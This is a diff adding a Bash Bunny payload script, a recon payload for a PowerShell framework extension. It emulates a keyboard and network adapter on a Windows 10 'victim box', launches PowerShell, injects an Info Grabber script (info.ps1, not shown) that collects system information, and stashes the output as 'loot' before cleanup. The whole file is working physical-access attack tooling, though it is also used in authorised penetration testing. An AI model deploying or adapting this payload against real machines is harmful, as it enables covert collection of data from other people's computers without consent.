@@ -1,0 +1,34 @@
+#!/bin/bash
+############################################################################################
+#
+# Title:         Info Grabber payload rejigged to work with the framework
+# Description:   Example recon payload for the Bashbunny Powershell Framework.  Bashbunny
+#                can be removed when the LED goes green.  Powershell scripts runs in a 
+#                visible powershell window in unattended mode - it could be hidden
+#                The active powershell payload is from Info Grabber (info.ps1)
+#
+# Orig Author:   V1   Author:      Simen Kjeserud
+#				 V2.0 Author:      DannyK999
+# As amended by: p3rki3
+# Version:       0.91
+# Dependencies:  bashbunny powershell framework extension, gohttp (for NET method only)
+# Category:      Recon
+# Target:        Windows 10 (Powershell) - may work on earlier versions, but untested
+# Attackmodes:   HID, Ethernet
+
+# Set interfaces - ethernet and keyboard and setup webserver; load powershell on victim box
+LED SETUP
+INVOKE_POWERSHELL "NET" "VISIBLE" "OFF"
+sleep 1
+
+LED STAGE1
+INJECT_PSSCRIPT "info.ps1" "infograbber.txt"
+
+# Cleanup
+LED CLEANUP
+CLOSE_POWERSHELL
+STASH_LOOT "InfoGrabber"
+ATTACKMODE OFF
+
+# Complete
+LED FINISH
